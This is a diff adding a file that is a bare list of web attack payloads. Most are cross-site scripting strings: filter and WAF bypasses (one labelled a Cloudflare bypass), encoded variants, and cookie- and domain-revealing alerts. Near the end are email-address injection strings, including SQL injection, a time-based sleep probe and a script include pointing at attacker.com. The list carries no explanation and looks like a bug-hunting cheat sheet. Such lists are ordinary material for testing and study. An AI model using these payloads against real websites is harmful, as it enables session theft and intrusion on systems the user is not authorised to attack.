@@ -1,0 +1,114 @@
+`<​/script><​script>alert(document.cookie)<​/script>`
+
+sm"*alert(1)*"
+
+"*alert(1)*"
+
+%22-alert('XSS')-%22
+
+<svg/onload​=alert(1)>
+
+&#60;body onload=alert('Abhishek_Dirisipo')&#62;&#34;&#34;
+
+<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+
+
+"><​script>alert(1)<​/script>
+"><img src=x onerror​=alert(1)>
+"><video src onerror​=alert(1)>
+"><audio src onerror​=alert(1)>
+"><svg/onload​=alert(1)>
+"><body/onload​=alert(1)>
+"><input/onfocus​=alert(1)>
+"><div onpointerover​=alert(1)>
+"><b onmouseover​=alert(1)>hover
+
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+
+ ">><plaintext%2Fonmouseover%3Dprompt(1)+><​script>prompt(1)<%2Fscript>
+
+<a href=[0x0b]xss" onfocus=prompt(1) autofocus fragment="
+
+```23%27);}</script><script>confirm(document.domain)</script>//```
+
+%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520autofocus%253D%2527
+
+%3C/script%20%3E
+
+mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
+
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+
+#1 : "><body/oNpagEshoW​=(prompt)()>
+#2 : "><body/oNpagEshoW​=(prompt)(document.domain)>
+#3 : "><input/onfocus​=(confirm)(document.domain)>
+#4 : "><body/oNpagEshoW​=(confirm)(document.domain)>
+#5 : "><body/onfocus​=(confirm)(document.domain)>
+#6 : "><Body/oNpagEshoW​=(prompt)(1)>
+
+anything"><svg/onload=prompt(7*7)>anything
+
+ ` '%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.
+fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode
+(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--
+><%2fSCRIPT>">'><​SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT>
+
+<IFRAME SRC="javascript​:prompt(document.cookie);"></iframe>
+
+"%5c"><body%2fonload%3d%26lt%3b!--%26gt%3b%26%2310confirm(1)%3bprompt(%2fXSS%2f.source)>"%2c
+
+<iframe srcdoc="<img src=x onerror=alert(document.cookie)>"></iframe>
+
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+
+<img+src%3dOnXSS+OnError%3dalert('XSs-Cloudflare-bypass-By-Dedi')>
+
+<img src=x onerror=alert(1)>
+
+<img src=x onerror=alert()>
+<img/src=x onerror=alert()>
+<img src="x"/onerror=alert()>
+<img src="x"onerror=alert()>
+<img\nsrc="x"onerror=alert()>
+<img src="x"> // this shows you can inject html into website but you cannot execute javascript code
+<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
+<iframe srcdoc="<script src=whitelisteddomain.com></script>"></iframe>
+
+ <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
+
+--></body><Svg Only=1 OnLoad=confirm(atob("YnlwYXNzX2J5X3ByaW5jZXJveQ=="))>
+
+<​script>alert(document.cookie)<​/script>
+
+XX"></SCRIPT><embed src
+
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+
+ "><img src=x onerrora=confirm() onerror=confirm(1)>
+
+ <iframe src="javascript:alert(document.domain)"></iframe>
+
+ "><body/oNpagEshoW​=(confirm)(document.domain)>
+
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`1` 
+
+%09Jav%09ascript:alert(document.domain)
+
+"><SVG ONLOAD=&#97&#108&#101&#114&#116(&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x64&#x6f&#x6d&#x61&#x69&#x6e)>.asp
+
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+
+
+"name":"test\"><payloads>"
+
+
+Payload=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+"'-sleep(5)-'"@mail.local.
+"'-alert(5)-'"@mail.local.
+"'--><script/src=//attacker.com></script>"@mail.local
+"<img/src/onerror=alert(5)>"@mail.local
+name(<script>alert(5)</script>)@mail.local
+name@mail(<script>alert(5)</script>).local
+"'OR 1=1 --'"@mail.local
+
+
